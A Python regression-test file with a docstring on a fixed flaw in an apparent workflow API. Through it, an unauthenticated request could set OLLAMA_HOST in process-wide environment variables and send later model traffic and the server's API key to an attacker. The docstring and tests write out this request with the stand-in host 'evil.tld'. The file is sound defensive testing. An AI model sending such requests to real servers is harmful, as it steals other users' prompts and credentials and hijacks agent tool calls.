"""A run request may supply a key. It may not say where the key is sent.

The attack this closes (reviews-2026-08-14 ticket 01), against the documented
cloud setup — `OLLAMA_API_KEY` set, `OLLAMA_HOST` unset — and auth off by
default:

    POST /api/runs {"credentials": {"OLLAMA_HOST": "https://evil.tld"}, ...}

One unauthenticated request. `apply_credentials` writes accepted credentials
into `os.environ`, which is **process-global and never request-scoped**, so
from that moment every Ollama call the process makes — for every caller —
goes to the attacker, carrying the prompt, whatever the workflow retrieved,
and the server's own `Authorization` header. The attacker also controls the
model's replies, and therefore any tool the agent goes on to call.

`apply_credentials`' docstring reasons this through carefully and reaches the
right rule *for a key*: absent → fill, present → leave alone, because a key
that loses to the server's own key is harmless. The reasoning does not
transfer to an **endpoint**. An endpoint being absent is the normal state of
the supported cloud configuration, so "fill when absent" is not a fallback
there — it is a redirection, and nothing later overrides it.

So the rule is narrower now: a request may set a **secret**, never an address.
The editor only ever sends `*_API_KEY` (`collectRuntimeCredentials` reads each
provider's `runtimeCredentialKey`), so nothing the product does is affected.
"""

from __future__ import annotations

import os

import pytest
from fastapi.testclient import TestClient

from openstategraph.api.main import create_app
from openstategraph.api.model_resolution import accepted_credential_keys, apply_credentials


class TestTheAcceptedSet:
    def test_a_key_is_still_accepted(self) -> None:
        accepted = accepted_credential_keys()

        assert "OLLAMA_API_KEY" in accepted
        assert "ANTHROPIC_API_KEY" in accepted
        assert "OPENAI_API_KEY" in accepted

    def test_an_address_is_not(self) -> None:
        accepted = accepted_credential_keys()

        assert "OLLAMA_HOST" not in accepted
        assert "OLLAMA_ENDPOINT" not in accepted

    def test_nothing_accepted_is_an_address(self) -> None:
        # The rule rather than the three examples: whatever providers are
        # registered, a request may only ever set something secret.
        for name in accepted_credential_keys():
            assert name.endswith(("_API_KEY", "_TOKEN", "_SECRET", "_PASSWORD")), name


class TestApplyCredentials:
    def test_an_endpoint_in_the_body_is_ignored(self, monkeypatch: pytest.MonkeyPatch) -> None:
        env: dict[str, str] = {}

        filled = apply_credentials({"OLLAMA_HOST": "https://evil.tld"}, env)

        assert filled == []
        assert env == {}

    def test_a_key_is_still_filled_when_absent(self) -> None:
        env: dict[str, str] = {}

        filled = apply_credentials({"OLLAMA_API_KEY": "sk-from-the-browser"}, env)

        assert filled == ["OLLAMA_API_KEY"]
        assert env["OLLAMA_API_KEY"] == "sk-from-the-browser"

    def test_a_server_key_still_wins(self) -> None:
        env = {"OLLAMA_API_KEY": "the-operators-key"}

        apply_credentials({"OLLAMA_API_KEY": "the-clients-key"}, env)

        assert env["OLLAMA_API_KEY"] == "the-operators-key"


class TestAcrossTwoRequests:
    """The shape of the bug, which one request cannot show.

    The damage is not to the attacker's own run — it is that the value
    persists in `os.environ` and every *later* run in that process inherits
    it. A test that makes a single request and inspects its answer sees
    nothing wrong.
    """

    def test_a_first_request_cannot_change_where_a_second_one_goes(
        self, tmp_path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.delenv("OLLAMA_HOST", raising=False)
        monkeypatch.delenv("OLLAMA_ENDPOINT", raising=False)
        monkeypatch.setenv("OLLAMA_API_KEY", "the-operators-key")

        client = TestClient(create_app(workflows_root=tmp_path))
        document = {
            "version": 1,
            "name": "x",
            "nodes": [{"id": "in1", "type": "input.text", "data": {}, "position": {"x": 0, "y": 0}}],
            "edges": [],
        }

        client.post(
            "/api/runs",
            json={
                "workflow": document,
                "question": "hi",
                "credentials": {"OLLAMA_HOST": "https://evil.tld"},
            },
        )

        # The second request is the victim, and it never said anything.
        assert os.environ.get("OLLAMA_HOST") is None
        assert "evil.tld" not in (os.environ.get("OLLAMA_ENDPOINT") or "")
